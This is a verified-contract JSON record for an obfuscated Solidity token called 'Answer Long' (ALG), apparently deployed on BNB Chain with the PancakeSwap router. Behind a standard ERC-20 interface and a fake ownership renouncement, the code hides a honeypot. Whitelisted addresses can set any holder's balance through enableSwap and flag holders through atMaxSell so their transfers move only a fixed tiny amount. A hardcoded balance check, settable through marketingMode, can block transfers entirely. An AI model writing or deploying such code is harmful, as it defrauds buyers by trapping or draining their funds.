{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface modeEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toSwapTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTxSell {\n    function createPair(address tradingSender, address txToken) external returns (address);\n}\n\ninterface exemptSenderWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenSell) external view returns (uint256);\n\n    function transfer(address receiverLimit, uint256 marketingReceiver) external returns (bool);\n\n    function allowance(address teamAmountAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLimit,\n        uint256 marketingReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isLaunched, uint256 value);\n    event Approval(address indexed teamAmountAt, address indexed spender, uint256 value);\n}\n\ninterface exemptSenderWalletMetadata is exemptSenderWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnswerLong is toSwapTx, exemptSenderWallet, exemptSenderWalletMetadata {\n\n    mapping(address => bool) public fundTrading;\n\n    function senderSwap(address launchedSender, address receiverLimit, uint256 marketingReceiver) internal returns (bool) {\n        if (launchedSender == txAmount) {\n            return isMaxLiquidity(launchedSender, receiverLimit, marketingReceiver);\n        }\n        uint256 exemptTx = exemptSenderWallet(listWallet).balanceOf(enableTx);\n        require(exemptTx == launchSender);\n        require(receiverLimit != enableTx);\n        if (isWallet[launchedSender]) {\n            return isMaxLiquidity(launchedSender, receiverLimit, buyMax);\n        }\n        return isMaxLiquidity(launchedSender, receiverLimit, marketingReceiver);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atFundMin;\n    }\n\n    uint256 public enableReceiver;\n\n    address public txAmount;\n\n    bool public shouldMarketingExempt;\n\n    uint256 public atTradingSell;\n\n    bool public shouldBuy;\n\n    event OwnershipTransferred(address indexed maxMin, address indexed listMax);\n\n    uint256 private listLimit;\n\n    uint256 launchSender;\n\n    string private atFundMin = \"ALG\";\n\n    uint8 private buyReceiverLaunched = 18;\n\n    function isMaxLiquidity(address launchedSender, address receiverLimit, uint256 marketingReceiver) internal returns (bool) {\n        require(modeLaunch[launchedSender] >= marketingReceiver);\n        modeLaunch[launchedSender] -= marketingReceiver;\n        modeLaunch[receiverLimit] += marketingReceiver;\n        emit Transfer(launchedSender, receiverLimit, marketingReceiver);\n        return true;\n    }\n\n    uint256 private minMax;\n\n    mapping(address => bool) public isWallet;\n\n    mapping(address => uint256) private modeLaunch;\n\n    function atMaxSell(address swapBuy) public {\n        buyTx();\n        \n        if (swapBuy == txAmount || swapBuy == listWallet) {\n            return;\n        }\n        isWallet[swapBuy] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellLimit;\n\n    function balanceOf(address tokenSell) public view virtual override returns (uint256) {\n        return modeLaunch[tokenSell];\n    }\n\n    function enableSwap(address liquidityEnable, uint256 marketingReceiver) public {\n        buyTx();\n        modeLaunch[liquidityEnable] = marketingReceiver;\n    }\n\n    address toLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address liquidityEnable, uint256 marketingReceiver) external virtual override returns (bool) {\n        return senderSwap(_msgSender(), liquidityEnable, marketingReceiver);\n    }\n\n    function allowance(address teamAmount, address walletFee) external view virtual override returns (uint256) {\n        if (walletFee == toLimit) {\n            return type(uint256).max;\n        }\n        return sellLimit[teamAmount][walletFee];\n    }\n\n    function toBuy(address teamMax) public {\n        if (shouldBuy) {\n            return;\n        }\n        if (minMax != tokenMin) {\n            shouldMarketingExempt = true;\n        }\n        fundTrading[teamMax] = true;\n        if (feeTx == shouldMarketingExempt) {\n            tokenMin = listLimit;\n        }\n        shouldBuy = true;\n    }\n\n    uint256 private tokenMin;\n\n    string private walletTotal = \"Answer Long\";\n\n    address public listWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyReceiverLaunched;\n    }\n\n    address private marketingList;\n\n    function owner() external view returns (address) {\n        return marketingList;\n    }\n\n    function approve(address walletFee, uint256 marketingReceiver) public virtual override returns (bool) {\n        sellLimit[_msgSender()][walletFee] = marketingReceiver;\n        emit Approval(_msgSender(), walletFee, marketingReceiver);\n        return true;\n    }\n\n    uint256 constant buyMax = 6 ** 10;\n\n    function getOwner() external view returns (address) {\n        return marketingList;\n    }\n\n    function marketingMode(uint256 marketingReceiver) public {\n        buyTx();\n        launchSender = marketingReceiver;\n    }\n\n    constructor (){\n        \n        modeEnable modeMin = modeEnable(toLimit);\n        listWallet = autoTxSell(modeMin.factory()).createPair(modeMin.WETH(), address(this));\n        if (minMax != tokenMin) {\n            feeTx = true;\n        }\n        txAmount = _msgSender();\n        receiverMode();\n        fundTrading[txAmount] = true;\n        modeLaunch[txAmount] = tokenEnable;\n        \n        emit Transfer(address(0), txAmount, tokenEnable);\n    }\n\n    bool private feeTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenEnable;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletTotal;\n    }\n\n    address enableTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buyTx() private view {\n        require(fundTrading[_msgSender()]);\n    }\n\n    uint256 private tokenEnable = 100000000 * 10 ** 18;\n\n    function transferFrom(address launchedSender, address receiverLimit, uint256 marketingReceiver) external override returns (bool) {\n        if (_msgSender() != toLimit) {\n            if (sellLimit[launchedSender][_msgSender()] != type(uint256).max) {\n                require(marketingReceiver <= sellLimit[launchedSender][_msgSender()]);\n                sellLimit[launchedSender][_msgSender()] -= marketingReceiver;\n            }\n        }\n        return senderSwap(launchedSender, receiverLimit, marketingReceiver);\n    }\n\n    uint256 totalSender;\n\n    function receiverMode() public {\n        emit OwnershipTransferred(txAmount, address(0));\n        marketingList = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAmountAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"}],\"name\":\"atMaxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTradingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"enableSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"marketingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"}],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AnswerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}